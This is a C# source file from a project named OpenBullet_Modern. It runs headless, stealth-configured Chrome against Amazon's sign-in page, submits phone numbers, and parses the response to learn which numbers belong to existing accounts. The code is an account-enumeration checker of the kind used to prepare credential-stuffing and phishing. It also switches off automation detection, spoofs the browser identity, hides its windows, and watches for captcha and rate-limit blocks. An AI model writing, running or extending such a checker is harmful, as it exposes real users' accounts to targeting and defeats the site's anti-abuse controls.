using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Text.RegularExpressions;

namespace OpenBullet_Modern
{
    /// <summary>
    /// Headless Chrome automation service for Amazon account validation
    /// Ensures no visible browser or console windows during automation
    /// </summary>
    public class ChromeAutomationService : IDisposable
    {
        private IWebDriver? driver;
        private readonly ChromeOptions chromeOptions;
        private readonly TimeSpan defaultTimeout;
        private bool isDisposed = false;

        public ChromeAutomationService(int timeoutSeconds = 30)
        {
            defaultTimeout = TimeSpan.FromSeconds(timeoutSeconds);
            chromeOptions = ConfigureHeadlessChrome();
        }

        private ChromeOptions ConfigureHeadlessChrome()
        {
            var options = new ChromeOptions();
            
            // ===== CRITICAL: HEADLESS CONFIGURATION =====
            // This prevents Chrome browser window from appearing
            options.AddArgument("--headless=new");  // Use new headless mode
            options.AddArgument("--no-sandbox");
            options.AddArgument("--disable-dev-shm-usage");
            
            // ===== ANTI-DETECTION & STEALTH =====
            options.AddArgument("--disable-blink-features=AutomationControlled");
            options.AddUserProfilePreference("credentials_enable_service", false);
            options.AddUserProfilePreference("profile.password_manager_enabled", false);
            options.AddArgument("--disable-extensions");
            options.AddArgument("--no-first-run");
            options.AddArgument("--disable-default-apps");
            options.AddArgument("--disable-popup-blocking");
            
            // ===== CONSOLE HIDING =====
            // These prevent console windows and logging output
            options.AddArgument("--silent");
            options.AddArgument("--log-level=3");  // Only fatal errors
            options.AddArgument("--disable-logging");
            options.AddArgument("--disable-gpu-logging");
            options.AddArgument("--quiet");
            
            // ===== PERFORMANCE OPTIMIZATIONS =====
            options.AddArgument("--disable-gpu");
            options.AddArgument("--disable-images");
            options.AddArgument("--disable-javascript");  // Amazon works without JS for basic form submission
            options.AddArgument("--disable-plugins");
            options.AddArgument("--disable-web-security");
            
            // ===== REALISTIC BROWSER SIMULATION =====
            options.AddArgument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            options.AddArgument("--window-size=1920,1080");
            options.AddArgument("--lang=en-US");
            options.AddArgument("--accept-lang=en-US,en");
            
            // ===== ADDITIONAL STEALTH MEASURES =====
            options.AddExcludedArgument("enable-automation");
            options.AddArgument("--disable-blink-features=AutomationControlled");
            
            return options;
        }

        public async Task<ValidationResult> ValidateAmazonAccountAsync(string phoneNumber, string targetUrl = "https://www.amazon.ca/ap/signin")
        {
            try
            {
                // Initialize Chrome driver with headless options
                await InitializeDriverAsync();
                
                if (driver == null)
                {
                    return new ValidationResult
                    {
                        PhoneNumber = phoneNumber,
                        IsValid = false,
                        DetectedKey = "CHROME_INIT_FAILED",
                        ErrorMessage = "Failed to initialize headless Chrome driver"
                    };
                }

                // Step 1: Navigate to Amazon sign-in page
                await driver.Navigate().GoToUrlAsync(targetUrl);
                await Task.Delay(1500); // Wait for page load

                // Step 2: Find and fill phone/email input
                var emailInput = await FindElementSafelyAsync(By.Id("ap_email"), 5);
                if (emailInput == null)
                {
                    // Try alternative selectors
                    emailInput = await FindElementSafelyAsync(By.Name("email"), 3);
                }

                if (emailInput == null)
                {
                    return new ValidationResult
                    {
                        PhoneNumber = phoneNumber,
                        IsValid = false,
                        DetectedKey = "EMAIL_INPUT_NOT_FOUND",
                        ErrorMessage = "Could not find email/phone input field"
                    };
                }

                // Step 3: Enter phone number and submit
                await emailInput.ClearAsync();
                await emailInput.SendKeysAsync(phoneNumber);
                await Task.Delay(500);

                // Step 4: Find and click continue button
                var continueBtn = await FindElementSafelyAsync(By.Id("continue"), 3);
                if (continueBtn == null)
                {
                    continueBtn = await FindElementSafelyAsync(By.XPath("//input[@type='submit']"), 3);
                }

                if (continueBtn != null)
                {
                    await continueBtn.ClickAsync();
                    await Task.Delay(2000); // Wait for response
                }

                // Step 5: Analyze the response
                var pageSource = driver.PageSource;
                return AnalyzeAmazonResponse(pageSource, phoneNumber);
            }
            catch (Exception ex)
            {
                return new ValidationResult
                {
                    PhoneNumber = phoneNumber,
                    IsValid = false,
                    DetectedKey = "CHROME_AUTOMATION_ERROR",
                    ErrorMessage = $"Chrome automation failed: {ex.Message}"
                };
            }
            finally
            {
                // Always clean up the driver after each validation
                await DisposeDriverAsync();
            }
        }

        private async Task InitializeDriverAsync()
        {
            try
            {
                // Create ChromeDriverService with logging disabled
                var service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;  // CRITICAL: Hide console window
                service.SuppressInitialDiagnosticInformation = true;
                service.EnableVerboseLogging = false;
                
                // Initialize driver with headless options
                driver = new ChromeDriver(service, chromeOptions, defaultTimeout);
                
                // Configure timeouts
                driver.Manage().Timeouts().PageLoad = defaultTimeout;
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                
                await Task.Delay(100); // Brief initialization delay
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to initialize headless Chrome: {ex.Message}");
            }
        }

        private async Task<IWebElement?> FindElementSafelyAsync(By locator, int timeoutSeconds)
        {
            try
            {
                var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(timeoutSeconds));
                return wait.Until(d => d.FindElement(locator));
            }
            catch
            {
                return null;
            }
        }

        private ValidationResult AnalyzeAmazonResponse(string pageSource, string phoneNumber)
        {
            // Check for common Amazon validation patterns
            var validationPatterns = new Dictionary<string, bool>
            {
                // SUCCESS patterns (account exists)
                { "Enter your password", true },
                { "ap_password", true },
                { "Sign-In", true },
                { "signInSubmit", true },
                
                // FAILURE patterns (no account)
                { "We cannot find an account", false },
                { "No account found", false },
                { "Incorrect phone number", false },
                { "ap_ra_email_or_phone", false },
                { "Please check your email address", false },
                { "There was a problem", false },
                { "Enter a valid email or phone number", false }
            };

            // Analyze response for validation patterns
            foreach (var pattern in validationPatterns)
            {
                if (pageSource.Contains(pattern.Key, StringComparison.OrdinalIgnoreCase))
                {
                    return new ValidationResult
                    {
                        PhoneNumber = phoneNumber,
                        IsValid = pattern.Value,
                        DetectedKey = pattern.Key,
                        FullMatchedText = ExtractRelevantContext(pageSource, pattern.Key),
                        ResponseContent = pageSource.Length > 1000 ? pageSource.Substring(0, 1000) : pageSource
                    };
                }
            }

            // Check for rate limiting or blocking
            if (pageSource.Contains("Please Enable Cookies") || 
                pageSource.Contains("Robot Check") ||
                pageSource.Contains("captcha"))
            {
                return new ValidationResult
                {
                    PhoneNumber = phoneNumber,
                    IsValid = false,
                    DetectedKey = "AMAZON_BLOCKING_DETECTED",
                    ErrorMessage = "Amazon is blocking requests - rate limited or captcha required"
                };
            }

            // Default - unclear response
            return new ValidationResult
            {
                PhoneNumber = phoneNumber,
                IsValid = false,
                DetectedKey = "UNCLEAR_RESPONSE",
                FullMatchedText = "Could not determine account status from response",
                ResponseContent = pageSource.Length > 500 ? pageSource.Substring(0, 500) : pageSource
            };
        }

        private string ExtractRelevantContext(string pageSource, string keyword)
        {
            try
            {
                var keywordIndex = pageSource.IndexOf(keyword, StringComparison.OrdinalIgnoreCase);
                if (keywordIndex >= 0)
                {
                    var start = Math.Max(0, keywordIndex - 100);
                    var length = Math.Min(200, pageSource.Length - start);
                    return pageSource.Substring(start, length);
                }
                return keyword;
            }
            catch
            {
                return keyword;
            }
        }

        private async Task DisposeDriverAsync()
        {
            try
            {
                if (driver != null)
                {
                    driver.Quit();
                    driver.Dispose();
                    driver = null;
                }
                await Task.Delay(100); // Brief cleanup delay
            }
            catch
            {
                // Ignore cleanup errors
            }
        }

        public void Dispose()
        {
            if (!isDisposed)
            {
                DisposeDriverAsync().Wait();
                isDisposed = true;
            }
        }
    }
}
